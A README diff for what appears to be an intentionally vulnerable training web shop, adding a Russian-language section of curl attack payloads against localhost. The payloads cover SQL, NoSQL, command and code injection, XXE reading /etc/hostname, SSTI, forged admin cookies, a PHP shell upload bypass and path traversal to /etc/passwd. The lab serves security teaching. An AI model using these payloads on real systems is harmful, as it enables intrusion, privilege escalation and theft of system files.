@@ -67,6 +67,130 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 - LFI / Path traversal: `GET /pages?page=...`
 - RFI: `GET /remote/include?url=...`
 
+## Примеры payload'ов к атакам
+
+> Все примеры использовать **только локально** в учебной среде.
+
+### SQL Injection
+
+**In-band (`/products/search`, `/products/<pid>`):**
+```bash
+curl "http://localhost:8000/products/search?q=' OR 1=1 -- -"
+curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4 -- -"
+curl "http://localhost:8000/products/1 OR 1=1"
+```
+
+**Boolean-based blind (`/api/stock`):**
+```bash
+curl "http://localhost:8000/api/stock?id=1 AND 1=1"
+curl "http://localhost:8000/api/stock?id=1 AND 1=2"
+```
+
+**Time-based blind (`/api/shipping`):**
+```bash
+curl "http://localhost:8000/api/shipping?zip=10000"
+curl "http://localhost:8000/api/shipping?zip=10000 OR SLEEP(5)"
+```
+
+**Second-order (`/admin/reports?u=...`):**
+1) Сохранить payload в `users.bio` (через `/account/profile`) например:
+```sql
+' OR 1=1 -- 
+```
+2) Вызвать:
+```bash
+curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
+```
+
+### NoSQL Injection (`/product/<pid>/reviews/moderation`)
+```bash
+curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d 'author={"$ne":null}&rating={"$gt":0}' \
+  -b "role=YWRtaW4="
+```
+
+### Command Injection (`/shipping/carrier/diagnostics`)
+```bash
+curl -X POST "http://localhost:8000/shipping/carrier/diagnostics" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "host=127.0.0.1;id"
+```
+
+### Code Injection (`/admin/pricing/rules/preview`)
+```bash
+curl -X POST "http://localhost:8000/admin/pricing/rules/preview" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d 'expr=__import__("os").popen("id").read()' \
+  -b "role=YWRtaW4="
+```
+
+### Host Header Injection (`/admin.php`)
+```bash
+curl "http://localhost:8000/admin.php" \
+  -H "X-Forwarded-Host: 176.105.200.130" \
+  -b "role=YWRtaW4="
+
+curl "http://localhost:8000/admin.php" \
+  -H "X-Forwarded-For: 176.105.200.130" \
+  -b "role=YWRtaW4="
+```
+
+### XML Injection / XXE (`/admin/catalog/import/xml`)
+```bash
+curl -X POST "http://localhost:8000/admin/catalog/import/xml" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'xml_payload=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><products><item><name>&xxe;</name></item></products>' \
+  -b "role=YWRtaW4="
+```
+
+### SSTI (`/admin/marketing/email/preview`)
+```bash
+curl -X POST "http://localhost:8000/admin/marketing/email/preview" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'user=test' \
+  --data-urlencode 'tpl={{7*7}}' \
+  -b "role=YWRtaW4="
+```
+
+### Auth/Session
+
+**HTTP Verb tampering (`PUT /auth/login`):**
+```bash
+curl -X PUT "http://localhost:8000/auth/login?username=alice"
+```
+
+**IDOR (`/orders/<id>`):**
+```bash
+curl "http://localhost:8000/orders/1"
+curl "http://localhost:8000/orders/2"
+```
+
+**Privilege escalation via cookie role:**
+```bash
+# user -> admin
+# dXNlcg== -> YWRtaW4=
+curl "http://localhost:8000/admin.php" -b "role=YWRtaW4="
+```
+
+### File handling
+
+**Upload bypass (`/files/upload`):**
+```bash
+curl -X POST "http://localhost:8000/files/upload" \
+  -F "file=@shell.php5;type=image/png"
+```
+
+**LFI / traversal (`/pages`):**
+```bash
+curl "http://localhost:8000/pages?page=../../../../etc/passwd"
+```
+
+**RFI (`/remote/include`):**
+```bash
+curl "http://localhost:8000/remote/include?url=https://example.org"
+```
+
 ## Реалистичный функционал магазина
 - Каталог, карточка товара, корзина, checkout.
 - Личный кабинет, редактирование профиля, адресная книга.
